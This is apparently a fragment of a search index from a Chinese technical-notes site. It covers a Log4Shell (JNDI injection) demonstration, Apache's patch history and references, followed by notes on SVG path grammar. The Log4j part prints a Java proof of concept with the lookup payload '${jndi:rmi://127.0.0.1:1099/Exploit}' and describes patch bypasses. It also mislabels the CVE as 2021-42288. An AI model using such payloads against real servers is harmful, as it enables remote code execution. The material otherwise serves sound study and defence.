args ) { System . setProperty ( \"com.sun.jndi.rmi.object.trustURLCodebase\" , \"true\" ); System . setProperty ( \"com.sun.jndi.ldap.object.trustURLCodebase\" , \"true\" ); logger . error ( \"${jndi:rmi://127.0.0.1:1099/Exploit}\" ); } } \u8fd0\u884c\u53d1\u73b0\u8ba1\u7b97\u5668\u5df2\u88ab\u8c03\u51fa\uff1a","title":"RMI \u5b9e\u73b0"},{"location":"cs/web/log4j_vuln/#log4j_6","text":"\u9ad8\u7248\u672c\u7684 JDK \u4e2d\u8bbe\u7f6e\u4e86 com.sun.jndi.xxx.object.trustURLCodebase \u9ed8\u8ba4\u4e3a false\uff0c\u8fd9\u53ef\u4ee5\u9632\u6b62\u4e00\u90e8\u5206 JNDI \u6ce8\u5165\u7684\u53d1\u751f\u3002 \u5728 CVE-2021-42288 \u53d1\u5e03\u540e\uff0cApache \u901a\u8fc7 #608 \u8fd9\u4e2a pull request \u6765\u5bf9 LDAP \u8fdb\u884c\u4e86\u9650\u5236\uff0c\u5e76\u53d1\u5e03\u4e86 2.15.0-rc1 \u7248\u672c\u3002\u4f46\u8fd9\u4e2a\u7248\u672c\u4ecd\u5b58\u5728\u7ed5\u8fc7\u65b9\u5f0f\uff0c\u5373\u901a\u8fc7\u6784\u9020\u51fa\u4f1a\u629b\u51fa\u5f02\u5e38\u7684 payload \u5c31\u53ef\u4ee5\u7ed5\u8fc7\u68c0\u9a8c\u3002 \u968f\u540e Apache \u53c8\u8fdb\u884c\u4e86\u5bf9\u4e8e\u5f02\u5e38 URI \u7684\u5904\u7406\uff0c\u53d1\u5e03\u4e86 2.15.0-rc2 \u7248\u672c\uff0c\u4f46\u8fd9\u4e2a\u7248\u672c\u4ecd\u4f1a\u901a\u8fc7\u8f83\u590d\u6742\u7684\u7ed5\u8fc7\u5b9e\u73b0 RCE\u3002\u56e0\u6b64\u5728 2.16.0-rc1 \u7248\u672c\u4e2d\uff0cMessage Lookups \u88ab\u5f7b\u5e95\u5220\u9664\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u88ab\u89e6\u53d1\u7684\u60c5\u51b5\u5c31\u66f4\u5c11\u4e86\uff0c\u4f46\u5982\u679c\u5f00\u53d1\u8005\u624b\u52a8\u5f00\u542f JNDI \u529f\u80fd\uff0c\u5219\u4ecd\u6709\u53ef\u80fd\u901a\u8fc7\u4e00\u7cfb\u5217\u7ed5\u8fc7\u5b9e\u73b0\u6ce8\u5165\u3002 \u4f46\u662f\u5728 2.16.0 \u7248\u672c\u4e2d\u5982\u679c\u6ca1\u6709\u5f00\u542f JNDI \u529f\u80fd\uff0c\u5219\u53cc\u5c42\u5d4c\u5957\u7684 ${${...}} \u4f1a\u5bfc\u81f4\u65e0\u9650\u9012\u5f52\uff0c\u4ece\u800c\u9020\u6210 DoS \u653b\u51fb\uff0c\u8fd9\u4e5f\u5c31\u662f\u540e\u7eed\u7684 CVE-2021-45046 \u8fd9\u4e2a\u6f0f\u6d1e\u3002\u968f\u540e\u5728 2.17.0 \u7248\u672c\u4e2d Apache \u4fee\u590d\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u5e76\u4e14\u9650\u5236\u5373\u4f7f\u5f00\u542f\u4e86 JNDI \u529f\u80fd\uff0c\u5176\u4ec5\u652f\u6301 java \u534f\u8bae\u800c\u4e0d\u652f\u6301 ldap\uff0c2.15.0-rc2 \u548c 2.16.0 \u4e2d\u7684\u7ed5\u8fc7\u4e5f\u65e0\u6548\u4e86\u3002\u56e0\u6b64 2.17.0 \u4e5f\u5c31\u6210\u4e3a\u4e86\u53ef\u4ee5\u5b8c\u5168\u9632\u6b62\u8fd9\u4e00\u6f0f\u6d1e\u7684 log4j \u7248\u672c\u4e86\u3002","title":"log4j \u6f0f\u6d1e\u4fee\u590d"},{"location":"cs/web/log4j_vuln/#reference","text":"CVE-2021-42288. https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228 NVD, CVE-2021-44228 Detail. https://nvd.nist.gov/vuln/detail/CVE-2021-44228 Apache Log4j Security Vulnerabilities. https://logging.apache.org/log4j/2.x/security.html \u3010\u6f0f\u6d1e\u901a\u544a\u3011Apache Log4j2 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE-2021-44228/CVE-2021-45046\uff09. https://help.aliyun.com/noticelist/articleid/1060971232.html Free Wortley, et al., Log4Shell: RCE 0-day exploit found in log4j2, a popular Java logging package. https://www.lunasec.io/docs/blog/log4j-zero-day/ tangxiaofeng7, CVE-2021-44228-Apache-Log4j-Rce. https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce mbechler, marshalsec toolchain. https://github.com/mbechler/marshalsec log4j \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u539f\u7406\u53ca\u4fee\u590d\u65b9\u6848. https://zhuanlan.zhihu.com/p/444140910 JNDI \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u539f\u7406\u5206\u6790\u53ca\u89e3\u51b3\u65b9\u6848. https://zhuanlan.zhihu.com/p/447220806 Java Tutorials, Overview of JNDI. https://docs.oracle.com/javase/tutorial/jndi/overview/index.html Java Tutorials, An Overview of RMI Applications. https://docs.oracle.com/javase/tutorial/rmi/overview.html TutorialsPoint, Java RMI - Introduction. https://www.tutorialspoint.com/java_rmi/java_rmi_introduction.htm Java \u4e2d RMI \u7684\u4f7f\u7528. https://cloud.tencent.com/developer/article/1824106 Pickle, \u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\uff08RMI\uff09\u539f\u7406\u4e0e\u793a\u4f8b. https://www.cnblogs.com/wxisme/p/5296441.html Authing \u8eab\u4efd\u4e91, LDAP \u534f\u8bae\u5165\u95e8\uff08\u8f7b\u91cf\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae\uff09. https://zhuanlan.zhihu.com/p/147768058 JNDI \u6ce8\u5165\u539f\u7406\u53ca\u5229\u7528. https://xz.aliyun.com/t/6633#toc-7 hldfight, log4j \u5b98\u65b9\u6f0f\u6d1e\u4fee\u590d\u53f2. https://blog.csdn.net/qsort_/article/details/122101423 rgoers, Restrict LDAP access via JNDI. https://github.com/apache/logging-log4j2/pull/608 LOG4J2-3211 - Remove Messge Lookups. https://github.com/apache/logging-log4j2/pull/623 \u4ece\u96f6\u5230\u4e00\u5e26\u4f60\u6df1\u5165 log4j2 Jndi RCE CVE-2021-44228 \u6f0f\u6d1e - 2.15.0 rc1\u7ed5\u8fc7\u8be6\u89e3. https://paper.seebug.org/1789/#0x06-2150-rc1 4ra1n, \u6d45\u8c08 Log4j2 \u4e4b 2.15.0 \u7248\u672c RCE. https://xz.aliyun.com/t/10689","title":"Reference"},{"location":"cs/web/svg/","text":"SVG \u00b6 Abstract SVG\uff08Scalable Vector Graphics\uff09\u662f\u4e00\u79cd\u57fa\u4e8e XML \u63cf\u8ff0\u77e2\u91cf\u56fe\u5f62\u7684\u56fe\u7247\u683c\u5f0f \u73b0\u884c\u6807\u51c6\u662f SVG 2\uff1a https://www.w3.org/TR/SVG/ SVG 1.1\uff1a https://www.w3.org/TR/SVG11/ SVG 2 \u4ecd\u5728 CR \u9636\u6bb5\uff0c\u533a\u522b\uff1a https://www.w3.org/TR/SVG/changes.html REC-SVG11-20110816.pdf SVG \u6807\u51c6\u6587\u6863\u8fd8\u6ca1\u6709\u5b8c\u6574\u8bfb\u8fc7\uff0c\u8fd9\u91cc\u53ea\u662f\u4e00\u4e9b\u5728\u4fee manim \u7684 SVGMobject \u7684\u65f6\u5019\u5b66\u5230\u7684 SVG \u76f8\u5173\u5185\u5bb9 SVG Namespace: http://www.w3.org/2000/svg Public Identifier for SVG 1.1: PUBLIC \"-//W3C//DTD SVG 1.1//EN\" System Identifier for the SVG 1.1 Recommendation: http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd \u5750\u6807\u7cfb\u7edf \u00b6 \u5de6\u4e0a\u89d2\u4e3a\u539f\u70b9\uff0c\u5411\u53f3\u4e3a x \u6b63\u65b9\u5411\uff0c\u5411\u4e0b\u4e3a y \u6b63\u65b9\u5411 transform \u5c5e\u6027\u4f1a\u6539\u53d8\u5143\u7d20\u53ca\u5176\u5b50\u5143\u7d20\u7684\u5750\u6807\u7cfb \u5e38\u89c1 EBNF \u8bed\u6cd5 \u00b6 \u4e00\u4e9b SVG \u7684 EBNF coordinate-pair : coordinate comma-wsp coordinate | coordinate negative-coordinate coordinate : number number : sign ? integer-constant | sign ? floating-point-constant negative-coordinate : \"-\" integer-constant | \"-\" floating-point-constant comma-wsp : ( wsp + comma ? wsp *) | ( comma wsp *) comma : \",\" integer-constant : digit-sequence floating-point-constant : fractional-constant exponent ? | digit-sequence exponent fractional-constant : digit-sequence ? \".\" digit-sequence | digit-sequence \".\" exponent : ( \" e \" | \" E \" ) sign ? digit-sequence sign : \"+\" | \"-\" digit-sequence : digit | digit digit-sequence digit : \"0\" | \"1\" | \"2\" | \"3\" | \"4\" | \"5\" | \"6\" | \"7\" | \"8\" | \"9\" wsp : (# x20 | # x9 | # xD | # xA )+ \u4ece\u540e\u5f80\u524d\u6765\u770b\uff1a wsp\uff1a\u7a7a\u683c\uff0c\u5305\u542b\u56db\u79cd\uff0cASCII \u7801\u503c\u4e3a 0x9, 0x20, 0xA, 0xD \uff08SVG2 \u4e2d\u591a\u4e86 0xC \uff09\uff0c\u5e76\u4e14\u53ef\u4ee5\u8fde\u7eed\u591a\u4e2a digit: \u6570\u5b57\u5b57\u7b26\uff0c0 \u5230 9 digit-sequence: \u6570\u5b57\u5b57\u7b26\u5e8f\u5217\uff0c\u53ef\u4ee5\u4e3a\u5355\u4e2a\u6216\u8005\u591a\u4e2a\u6570\u5b57\u5b57\u7b26 sign: \u7b26\u53f7\uff0c+ \u6216 - exponent: \u6307\u6570\uff0ce \u5927\u5c0f\u5199\u5747\u53ef\uff0c\u6307\u6570\u662f\u6709\u7b26\u53f7\u6216\u8005\u65e0\u7b26\u53f7\uff08\u5373\u6b63\uff09\u6574\u6570\uff0c\u5982 e2 E+2 E-10 \u5747\u4e3a\u5408\u6cd5 exponent fractional-constant: \u5206\u6570\u5e38\u6570\uff0c\u6574\u6570\u90e8\u5206\u4e3a 0 \u53ef\u4ee5\u7701\u7565\uff0c\u5c0f\u6570\u90e8\u5206\u4e3a 0 \u4e5f\u53ef\u4ee5\u7701\u7565\uff0c\u5982 1.2 .3 4. \u53ef\u4ee5\u8868\u793a\u4e09\u4e2a\u5206\u6570\u5e38\u6570 1.2, 0.3, 4.0 floating-point-constant: \u6d6e\u70b9\u6570\u5e38\u6570\uff0c\u53ef\u4ee5\u662f \u5206\u6570\u5e38\u6570 / \u5206\u6570\u5e38\u6570\u52a0\u6307\u6570 / \u6574\u6570\u5e38\u6570\u52a0\u6307\u6570 integer-constant: \u6574\u6570\u5e38\u6570\uff0c\u5373\u6570\u5b57\u5b57\u7b26\u5e8f\u5217 comma: \u9017\u53f7\u5b57\u7b26 , \uff0cASCII \u7801\u503c 0x2C comma-wsp: \u95f4\u9694\u7b26\uff0c\u53ef\u4ee5\u662f \u9017\u53f7 / \u9017\u53f7\u52a0\u4efb\u610f\u591a\u7a7a\u683c / \u4efb\u610f\u591a\u7a7a\u683c / \u4efb\u610f\u591a\u7a7a\u683c\u52a0\u9017\u53f7\u52a0\u4efb\u610f\u591a\u7a7a\u683c negative-coordinate: \u8d1f\u5750\u6807\u503c\uff0c\u53ef\u4ee5\u662f \u8d1f\u53f7\u52a0\u6574\u6570\u5e38\u6570 / \u8d1f\u53f7\u52a0\u6d6e\u70b9\u6570\u5e38\u6570 number: \u6570\u5b57\uff0c\u6709\u7b26\u53f7\u6216\u8005\u65e0\u7b26\u53f7\uff08\u6b63\uff09\u7684\u6574\u6570\u5e38\u6570\u6216\u8005\u6d6e\u70b9\u6570\u5e38\u6570 coordinate: \u5750\u6807\u503c\uff0c\u5373\u6570\u5b57 number coordinate-pair: \u5750\u6807\uff0c\u53ef\u4ee5\u662f\u4e24\u4e2a\u7528 comma-wsp \u5206\u9694\u7684\u5750\u6807\u503c\uff0c\u7b2c\u4e8c\u4e2a\u5750\u6807\u503c\u4e3a\u8d1f\u7684\u65f6\u5019\u53ef\u4ee5\u4e0d\u8fdb\u884c\u5206\u9694\uff0c\u5373 1-2 \u8868\u793a (1, -2) \u8bfb\u53d6\u6570\u5b57\u7684\u6b63\u5219\u8868\u8fbe\u5f0f \u00b6 \u4ece\u5b57\u7b26\u4e32\u4e2d\u8bfb\u53d6\u51fa\u4e0a\u9762\u7684 number \u53ef\u4ee5\u76f4\u63a5\u7528\u4e00\u4e2a\u6b63\u5219\u6765\u89e3\u51b3\uff1a [-+]?(?:\\d+(?:\\.\\d*)?|\\.\\d+)(?:[eE][-+]?\\d+)? \u4e5f\u5c31\u662f\u4e0a\u9762\u7684\u6574\u4e2a\u903b\u8f91 \u6574\u4f53\u53ef\u4ee5\u662f +- \u6216\u8005\u4e0d\u6307\u5b9a\uff1a [-+]? \u6307\u6570\u524d\u90e8\u5206\uff1a (?:\\d+(?:\\.\\d*)?|\\.\\d+) \u6709\u6574\u6570\u90e8\u5206\uff1a \\d+(?:\\.\\d*)? \u6574\u6570\u90e8\u5206\uff1a \\d+ \u5c0f\u6570\u90e8\u5206\uff08\u53ef\u6709\u53ef\u65e0\uff09\uff1a (?:\\.\\d*)? \u5c0f\u6570\u70b9\uff1a \\. \u5c0f\u6570\u90e8\u5206\uff08\u53ef\u6709\u53ef\u65e0\uff09\uff1a \\d* \u65e0\u6574\u6570\u90e8\u5206\uff08\u5373\u5ffd\u7565 0\uff09\uff1a \\.\\d+ \u5c0f\u6570\u70b9\uff1a \\. \u5c0f\u6570\u90e8\u5206\uff08\u4e00\u5b9a\u6709\uff09\uff1a \\d+ \u6307\u6570\u90e8\u5206\uff08\u53ef\u6709\u53ef\u65e0\uff09\uff1a (?:[eE][-+]?\\d+)? \u6307\u6570\u6807\u8bc6\uff1a [eE] \u7b26\u53f7\uff08\u53ef\u6709\u53ef\u65e0\uff09\uff1a [-+]? \u6307\u6570\u90e8\u5206\uff08\u4e00\u5b9a\u6709\uff0c\u4e14\u662f\u6574\u6570\uff09\uff1a \\d+ \u4e3a\u4e86\u4e0d\u6355\u83b7 () \u4e2d\u7684\u5185\u5bb9\uff0c\u9700\u8981\u4f7f\u7528 (?:) \u4f7f\u7528\u7684\u65f6\u5019\u76f4\u63a5\u628a\u5339\u914d\u5230\u7684\u5185\u5bb9\u4f20\u5165 float \u5373\u53ef\uff1a number_pattern = re . compile ( r \"[-+]?(?:\\d+(?:\\.\\d*)?|\\.\\d+)(?:[eE][-+]?\\d+)?\" ) numbers = [ float ( x ) for x in number_pattern . findall ( number_string )] <svg> \u5143\u7d20 \u00b6 \u5728\u4e00\u4e2a SVG \u4e2d\uff0c\u53ef\u4ee5\u6709\u5f88\u591a <svg> \u5143\u7d20\uff0c\u6700\u5916\u5c42\u53ea\u6709\u4e00\u4e2a <svg> \u5143\u7d20\uff0c\u5185\u5c42\u53ef\u4ee5\u5d4c\u5957 svg \u89c4\u5b9a\u7684\u5143\u7d20\u90fd\u5728 XML \u547d\u540d\u7a7a\u95f4 http://www.w3.org/2000/svg \u4e2d\uff0c\u6240\u4ee5\u8981\u89c4\u5b9a xmlns=\"http://www.w3.org/2000/svg\" \u5c5e\u6027\uff1a version \u7248\u672c\u53f7\uff0c1.1 / 1.0 x \u5bf9\u4e8e\u6700\u5916\u5c42 svg \u5143\u7d20\u6ca1\u6709\u4f5c\u7528\uff0c\u5bf9\u4e8e\u5185\u5c42 svg \u5143\u7d20\u6307\u5b9a\u8fb9\u754c\u7684\u5de6\u4e0a\u89d2\u7684 x \u5750\u6807 y \u5bf9\u4e8e\u6700\u5916\u5c42 svg \u5143\u7d20\u6ca1\u6709\u4f5c\u7528\uff0c\u5bf9\u4e8e\u5185\u5c42 svg \u5143\u7d20\u6307\u5b9a\u8fb9\u754c\u7684\u5de6\u4e0a\u89d2\u7684 y \u5750\u6807 width \u89c4\u5b9a\u5bbd\u5ea6\uff0c\u53ef\u4ee5\u662f\u957f\u5ea6\u6216\u8005\u767e\u5206\u6bd4 height \u89c4\u5b9a\u9ad8\u5ea6 \u5176\u4ed6\u7ed3\u6784\u5143\u7d20 \u00b6 <g>\uff1a\u5373 group\uff0c\u53ef\u4ee5\u6709\u5b50\u5143\u7d20\uff0c\u5e76\u4e14\u53ef\u4ee5\u6709 id \u7528\u6765\u5f15\u7528 <defs>\uff1a\u5305\u542b\u4e00\u4e9b\u5b50\u5143\u7d20\uff0c\u7528\u6765\u590d\u7528\uff0c\u4e0d\u76f4\u63a5\u663e\u793a <symbol>\uff1a\u7c7b\u4f3c <g> <use>\uff1a\u590d\u7528\uff0c\u901a\u8fc7 xlink:href \u6765\u6307\u5b9a\u5f15\u7528\u5bf9\u8c61\uff0c\u5e76\u4e14\u53ef\u4ee5\u4f7f\u7528 x, y, style \u7b49\u4e00\u7cfb\u5217\u5c5e\u6027\u6765\u89c4\u5b9a\u4f4d\u7f6e\u548c\u6837\u5f0f \u5f62\u72b6\u5143\u7d20 \u00b6 \u5143\u7d20 \u5c5e\u6027 <rect> x, y \u5de6\u4e0a\u89d2\u5750\u6807 width, height \u77e9\u5f62\u5bbd\u9ad8 <circle> cx, cy \u5706\u5fc3\u5750\u6807 r \u5706\u534a\u5f84 <ellipse> cx, cy \u692d\u5706\u4e2d\u5fc3\u5750\u6807 rx, ry \u6c34\u5e73/\u5782\u76f4\u534a\u5f84 <line> x1, y1 \u8d77\u70b9\u5750\u6807 x2, y2 \u7ec8\u70b9\u5750\u6807 <polygon> points \u591a\u8fb9\u5f62\u7aef\u70b9\u5750\u6807 <polyline> points \u6298\u7ebf\u7aef\u70b9\u5750\u6807 <path> d \u8def\u5f84\u6307\u4ee4 <polygon> \u548c <polyline> \u7684 points \u8bed\u6cd5 \u00b6 EBNF \u8bed\u6cd5 \u5b83\u4eec\u7684 points \u5c5e\u6027\u7684\u503c\u90fd\u662f list-of-points \u7c7b\u578b list-of-points : wsp * coordinate-pairs ? wsp * coordinate-pairs : coordinate-pair | coordinate-pair comma-wsp coordinate-pairs \u7531\u4e0a\u9762\u7684\u89e3\u91ca\u540c\u7406\uff0c\u8fd9\u4e2a EBNF \u4e5f\u975e\u5e38\u6e05\u6670 coordinate-pairs: \u5750\u6807\u7ec4\uff0c\u7528 comma-wsp \u5206\u9694\u7684\u591a\u4e2a\u5750\u6807 list-of-points: \u70b9\u96c6\uff0c\u53ef\u4ee5\u662f \u7a7a / \u4efb\u610f\u591a\u7a7a\u683c / \u524d\u540e\u6709\u4efb\u610f\u591a\u7a7a\u683c\uff08\u542b0\uff09\u7684\u5750\u6807\u7ec4 points \u4e5f\u53ef\u4ee5\u76f4\u63a5\u8f6c\u6362\u4e3a path string\uff0cmanim \u4e2d\u5c31\u662f\u8fd9\u6837\u5904\u7406\u7684\uff0c\u5373\u628a\u6240\u6709 wsp digit \u90fd\u66ff\u6362\u4e3a \"L\" wsp digit\uff0c\u7136\u540e\u628a\u7b2c\u4e00\u4e2a L \u66ff\u6362\u4e3a M <path> \u8def\u5f84 \u00b6 <path> \u5143\u7d20\u901a\u8fc7\u5b83\u7684 d \u5c5e\u6027\u6765\u6307\u5b9a\u8def\u5f84\uff0c\u503c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32 \u8fd9\u4e2a\u8def\u5f84\u5b57\u7b26\u4e32\u7531\u4e00\u4e9b\u63a7\u5236\u547d\u4ee4\u548c\u540e\u9762\u63a5\u7740\u7684\u53c2\u6570\u6784\u6210\uff0c\u4e00\u5171\u5341\u79cd\u63a7\u5236\u547d\u4ee4\uff0c\u5206\u522b\u6709\u5927\u5199\u548c\u5c0f\u5199\u7684\u5f62\u5f0f \u5927\u5199\u8868\u793a\u540e\u9762\u7684\u53c2\u6570\u91cc\u7684\u5750\u6807\u662f\u7edd\u5bf9\u4f4d\u7f6e\uff0c\u5c0f\u5199\u8868\u793a\u540e\u9762\u7684\u53c2\u6570\u91cc\u7684\u5750\u6807\u662f\u76f8\u5bf9\u4e8e\u5f53\u524d\u5750\u6807\u7684\u76f8\u5bf9\u4f4d\u7f6e \u5e76\u4e14\u4e3a\u4e86\u538b\u7f29 SVG \u7684\u5927\u5c0f\uff0c\u4e5f\u6709\u4e00\u4e9b\u5141\u8bb8\u7684\u7f29\u5199\u89c4\u5219\uff1a \u53ef\u4ee5\u7701\u7565\u4e0d\u5fc5\u8981\u7684 comma-wsp \u5206\u9694\u7b26 \u5982\u679c\u591a\u6b21\u4f7f\u7528\u540c\u4e00\u4e2a\u547d\u4ee4\uff0c\u5219\u9664\u4e86\u7b2c\u4e00\u6b21\u4ee5\u5916\u5747\u53ef\u4ee5\u7701\u7565\u547d\u4ee4 \u53ef\u4ee5\u4f7f\u7528\u76f8\u5bf9\u5750\u6807 \u53ef\u4ee5\u4f7f\u7528\u6c34\u5e73\u548c\u5782\u76f4\u60c5\u51b5\u7684 lineto \u53ef\u4ee5\u7528 S/s/T/t \u6765\u7701\u7565\u7b2c\u4e00\u4e2a\u63a7\u5236\u70b9 \u4e0b\u9762\u4f9d\u6b21\u6765\u8bf4\u660e\u8fd9\u5341\u79cd\u63a7\u5236\u547d\u4ee4\uff1a \u547d\u4ee4 \u540d\u79f0 \u53c2\u6570 \u63cf\u8ff0 M or m moveto (x y)+ \u5f00\u542f\u4e00\u4e2a\u65b0\u7684\u8def\u5f84\uff0c\u53c2\u6570\u662f\u8d77\u70b9\u5750\u6807 \u5982\u679c\u53c2\u6570\u662f\u591a\u7ec4\u5750\u6807\uff0c\u5219\u9664\u7b2c\u4e00\u4e2a\u4ee5\u5916\u90fd\u5f53\u6210 L/l \u6307\u4ee4\u7684\u53c2\u6570\u6765\u5904\u7406 Z or z closepath \u5173\u95ed\u8def\u5f84\uff0c\u5373\u4ece\u5f53\u524d\u70b9\u5230\u5f53\u524d\u5b50\u8def\u5f84\u5f00\u5934\u70b9\u753b\u4e00\u6761\u76f4\u7ebf Z \u548c z \u7684\u6548\u679c\u76f8\u540c L or l lineto (x y)+ \u4ece\u5f53\u524d\u70b9\u5f00\u59cb\u753b\u76f4\u7ebf\uff0c\u53c2\u6570\u662f\u7aef\u70b9\u5750\u6807 H or h horizontal lineto x+ \u753b\u4e00\u6761\u6c34\u5e73\u7ebf\uff0c\u5230\u6a2a\u5750\u6807 x \u7684\u4f4d\u7f6e V or v vertical lineto y+ \u753b\u4e00\u6761\u7ad6\u76f4\u7ebf\uff0c\u5230\u7eb5\u5750\u6807 y \u7684\u4f4d\u7f6e C or c curveto (x1 y1 x2 y2 x y)+ \u4ece\u5f53\u524d\u70b9\u5230 (x, y) \u5229\u7528\u4e09\u9636\u8d1d\u585e\u5c14\u753b\u4e00\u6761\u66f2\u7ebf \u5176\u4e2d (x1, y1) \u662f\u5f53\u524d\u70b9\u7684\u63a7\u5236\u70b9\uff0c(x2, y2) \u662f\u7ed3\u675f\u70b9\u7684\u63a7\u5236\u70b9 S or s smooth curveto (x1 y1 x y)+ \u4ece\u5f53\u524d\u70b9\u5230 (x, y) \u5229\u7528\u4e09\u9636\u8d1d\u585e\u5c14\u753b\u4e00\u6761\u66f2\u7ebf \u5176\u4e2d\u5f53\u524d\u70b9\u7684\u63a7\u5236\u70b9\u662f\u4e0a\u4e00\u6761\u4e09\u9636\u8d1d\u585e\u5c14\u66f2\u7ebf\u7684\u7b2c\u4e8c\u4e2a\u63a7\u5236\u70b9\u5173\u4e8e\u5f53\u524d\u70b9\u7684\u4e2d\u5fc3\u5bf9\u79f0\u70b9\uff0c(x1, y1) \u662f\u7ed3\u675f\u70b9\u7684\u63a7\u5236\u70b9 \u5982\u679c\u6ca1\u6709\u4e0a\u4e00\u6761\u8def\u5f84\u6216\u8005\u4e0a\u4e00\u6761\u8def\u5f84\u4e0d\u662f\u4e09\u9636\u8d1d\u585e\u5c14\u66f2\u7ebf\uff08CcSs\uff09\uff0c\u5219\u5f53\u524d\u70b9\u7684\u63a7\u5236\u70b9\u5c31\u662f\u5f53\u524d\u70b9 Q or q quadratic bezier curveto (x1 y1 x y)+ \u4ece\u5f53\u524d\u70b9\u5230 (x, y) \u5229\u7528\u4e8c\u9636\u8d1d\u585e\u5c14\u753b\u4e00\u6761\u66f2\u7ebf \u5176\u4e2d (x1, y1) \u662f\u63a7\u5236\u70b9 T or t smooth quadratic bezier curveto (x y)+ \u4ece\u5f53\u524d\u70b9\u5230 (x, y) \u5229\u7528\u4e8c\u9636\u8d1d\u585e\u5c14\u753b\u4e00\u6761\u66f2\u7ebf \u5176\u4e2d\u63a7\u5236\u70b9\u662f\u4e0a\u4e00\u6761\u4e8c\u9636\u8d1d\u585e\u5c14\u66f2\u7ebf\u63a7\u5236\u70b9\u5173\u4e8e\u5f53\u524d\u70b9\u7684\u4e2d\u5fc3\u5bf9\u79f0\u70b9 \u5982\u679c\u6ca1\u6709\u4e0a\u4e00\u6761\u8def\u5f84\u6216\u8005\u4e0a\u4e00\u6761\u8def\u5f84\u4e0d\u662f\u4e8c\u9636\u8d1d\u585e\u5c14\u66f2\u7ebf\uff08QqTt\uff09\uff0c\u5219\u63a7\u5236\u70b9\u5c31\u662f\u5f53\u524d\u70b9 A or a elliptical arc \u6700\u540e\u4e00\u4e2a\u692d\u5706\u5f27\u7684\u53c2\u6570\u548c\u7528\u6cd5\u76f8\u5bf9\u590d\u6742\uff0c\u5355\u72ec\u6765\u8bf4\uff1a \u53c2\u6570\uff1a(rx ry x-axis-rotation large-arc-flag sweep-flag x y)+ \u7528\u6cd5\uff1a rx, ry\uff1a\u692d\u5706\u5f27\u7684\u6c34\u5e73\u548c\u5782\u76f4\u534a\u5f84 x-axis-rotation\uff1a\u4e00\u4e2a\u89d2\u5ea6\uff0c\u4ee5 deg \u4e3a\u5355\u4f4d\uff0c\u8868\u793a x \u8f74\u65cb\u8f6c\u89d2\u5ea6 large-arc-flag: 0 \u6216 1\uff0c\u662f 0 \u8868\u793a\u8fd9\u6bb5\u692d\u5706\u5f27\u5e94\u8be5\u662f\u52a3\u5f27\uff0c1 \u8868\u793a\u8fd9\u6bb5\u692d\u5706\u5f27\u5e94\u8be5\u662f\u4f18\u5f27 sweep-flag\uff1a0 \u6216 1\uff0c\u662f 0 \u8868\u793a\u4ece\u8d77\u70b9\u5230\u7ec8\u70b9\u6cbf\u9006\u65f6\u9488\u753b\u5f27\uff0c1 \u8868\u793a\u4ece\u8d77\u70b9\u5230\u7ec8\u70b9\u987a\u65f6\u9488\u753b\u5f27 x, y\uff1a\u7ec8\u70b9\u5750\u6807 A \u547d\u4ee4\u4f8b\u5b50 EBNF \u8bed\u6cd5 \u00b6 d \u5c5e\u6027\u91cc\u7684\u662f svg-path \u7c7b\u578b\uff0c\u5b9a\u4e49\u662f\uff1a svg-path : wsp * moveto-drawto-command-groups ? wsp * moveto-drawto-command-groups : moveto-drawto-command-group | moveto-drawto-command-group wsp * moveto-drawto-command-groups moveto-drawto-command-group : moveto wsp * drawto-commands ? drawto-commands : drawto-command | drawto-command wsp * drawto-commands drawto-command : closepath | lineto | horizontal-lineto | vertical-lineto | curveto | smooth-curveto | quadratic-bezier-curveto | smooth-quadratic-bezier-curveto | elliptical-arc drawto-command: \u9664\u4e86 M/m \u4ee5\u5916\u7684 9 \u79cd\u547d\u4ee4\u5b57\u7b26\u4e32 drawto-commands: \u7528\u4efb\u610f\u591a\uff08\u53ef\u4e3a0\uff09 wsp \u5206\u9694\u7684 drawto-command moveto-drawto-command-group: moveto \u547d\u4ee4\u5f00\u5934\u7684\u547d\u4ee4\u7ec4\uff08\u7528\u4e8e\u6307\u5b9a\u4e00\u4e2a\u5b50\u8def\u5f84\uff09\uff0c\u53ef\u4ee5\u4ec5\u6709 moveto\uff0c\u4e5f\u53ef\u4ee5\u662f\u7531\u4efb\u610f\u591a\uff08\u53ef\u7701\u7565\uff09wsp \u5206\u9694\u7684\u4e00\u4e9b\u547d\u4ee4 moveto-drawto-command-groups: \u5b50\u8def\u5f84\u96c6\u5408\uff0c\u7528\u4efb\u610f\u591a\uff08\u53ef\u7701\u7565\uff09wsp \u5206\u9694\u7684 moveto-drawto-command-group svg-path: \u53ef\u4ee5\u4e3a \u7a7a / \u5f00\u5934\u7ed3\u5c3e\u6709\u4efb\u610f\u591a wsp \u7684 moveto-drawto-command-groups \u4e0b\u9762\u662f\u5404\u4e2a\u547d\u4ee4\u7684\u8bed\u6cd5\uff0c\u90fd\u6bd4\u8f83\u6e05\u6670\uff0c\u5c31\u4e0d\u591a\u89e3\u91ca\u4e86\uff1a \u5404\u4e2a\u547d\u4ee4\u7684\u8bed\u6cd5 moveto : ( \" M \" | \" m \" ) wsp * moveto-argument-sequence moveto-argument-sequence : coordinate-pair | coordinate-pair comma-wsp ? lineto-argument-sequence closepath : (\" Z \" | \" z \") lineto : ( \" L \" | \" l \" ) wsp * lineto-argument-sequence lineto-argument-sequence : coordinate-pair | coordinate-pair comma-wsp ? lineto-argument-sequence horizontal-lineto : ( \" H \" | \" h \" ) wsp * horizontal-lineto-argument-sequence horizontal-lineto-argument-sequence : coordinate | coordinate comma-wsp ? horizontal-lineto-argument-sequence vertical-lineto : ( \" V \" | \" v \" ) wsp * vertical-lineto-argument-sequence vertical-lineto-argument-sequence : coordinate | coordinate comma-wsp ? vertical-lineto-argument-sequence curveto : ( \" C \" | \" c \" ) wsp * curveto-argument-sequence curveto-argument-sequence : curveto-argument | curveto-argument comma-wsp ? curveto-argument-sequence curveto-argument : coordinate-pair comma-wsp ? coordinate-pair comma-wsp ? coordinate-pair smooth-curveto : ( \" S \" | \" s \" ) wsp * 